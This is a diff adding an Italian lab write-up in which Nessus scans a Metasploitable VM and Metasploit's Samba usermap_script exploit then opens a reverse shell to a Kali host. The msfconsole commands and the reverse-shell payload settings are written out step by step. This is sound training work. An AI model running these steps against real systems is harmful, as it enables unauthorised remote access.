@@ -392,3 +392,104 @@ Segmentation fault (core dumped)
 
 ⚠️ **Nota:** La modalità con errore provoca un comportamento indefinito. Usala solo in ambienti di test controllati!
 
+---
+
+# 🛡️ Traccia Giorno 4: Sfruttamento di Vulnerabilità sulla Macchina Metasploitable
+
+## 📋 Descrizione
+Sulla macchina **Metasploitable** sono stati individuati diversi servizi in ascolto potenzialmente vulnerabili. Lo scopo di questa traccia è:
+1. 🖥️ Effettuare una scansione delle vulnerabilità con **Nessus**.
+2. ⚙️ Sfruttare la vulnerabilità del servizio Samba attivo sulla porta **445 TCP** utilizzando **Metasploit**.
+3. ✅ Verificare l'accesso alla macchina compromessa eseguendo il comando `ifconfig` per ottenere l'indirizzo IP della macchina vittima.
+
+---
+
+## 🔧 Requisiti
+- **IP Kali Linux**: `192.168.50.165`
+- **IP Metasploitable**: `192.168.50.3`
+- **Porta di ascolto del payload**: `5555`
+- **Tool utilizzati**: Nessus, MSFConsole (Metasploit)
+
+---
+
+## 🛠️ Passaggi Eseguiti
+
+### 1. 🔍 Scansione delle Vulnerabilità con Nessus
+1. **Avvio del servizio Nessus**:
+   ```bash
+   sudo systemctl start nessusd
+   ```
+2. **Accesso all'interfaccia web**:
+   - URL: `https://localhost:8834`.
+   - Completata la configurazione iniziale e aggiornato Nessus.
+3. **Creazione della scansione**:
+   - Tipo: **Basic Network Scan**.
+   - Target: `192.168.50.3` (IP di Metasploitable).
+4. **Esecuzione dello scan**:
+   - La scansione ha identificato una vulnerabilità critica sul servizio Samba in ascolto sulla porta **445 TCP**.
+5. **Report allegato**:
+   - I dettagli della scansione sono disponibili nel file `nessus_scan_report.html`.
+
+---
+
+### 2. 💻 Attacco alla Macchina Metasploitable con Metasploit
+1. **Avvio di MSFConsole**:
+   ```bash
+   msfconsole
+   ```
+2. **Ricerca dell'exploit appropriato**:
+   - Comando:
+     ```bash
+     search samba
+     ```
+   - Trovato: **exploit/multi/samba/usermap_script** (indice: 15).
+   - ![Screenshot della ricerca](SearchSambaMetaspl.png)
+3. **Selezione dell'exploit**:
+   - Comando:
+     ```bash
+     use 15
+     ```
+   - ![Screenshot della selezione dell'exploit](SambaUse15.png)
+4. **Configurazione dei parametri dell'exploit**:
+   - Impostazione dell'IP della macchina vittima:
+     ```bash
+     set RHOSTS 192.168.50.3
+     ```
+   - Impostazione della porta del servizio Samba:
+     ```bash
+     set RPORT 445
+     ```
+   - Configurazione del payload:
+     ```bash
+     set payload cmd/unix/reverse
+     ```
+   - Impostazione dell'IP e della porta di ascolto di Kali Linux:
+     ```bash
+     set LHOST 192.168.50.165
+     set LPORT 5555
+     ```
+5. **Esecuzione dell'exploit**:
+   - Comando:
+     ```bash
+     exploit
+     ```
+   - L'exploit ha avuto successo, fornendo una shell sulla macchina vittima.
+   - ![Screenshot del Meterpreter attivo](MeterpreterSambaMetaspl.png)
+
+---
+
+### 3. 📡 Verifica dell'Accesso alla Macchina Compromessa
+1. **Comando eseguito**:
+   Una volta ottenuta la shell sulla macchina Metasploitable, è stato eseguito il comando:
+   ```bash
+   ifconfig
+   ```
+2. **Risultato**:
+   - Confermato l'indirizzo IP della macchina vittima: `192.168.50.3`.
+
+---
+
+## ✅ Conclusioni
+- 🔎 Il **Vulnerability Scanning** ha evidenziato una vulnerabilità critica nel servizio Samba sulla porta **445 TCP**.
+- 💥 La vulnerabilità è stata sfruttata con successo utilizzando l'exploit **exploit/multi/samba/usermap_script** di Metasploit.
+- 🖥️ È stato ottenuto accesso alla macchina compromessa e confermato l'indirizzo IP tramite il comando `ifconfig`.
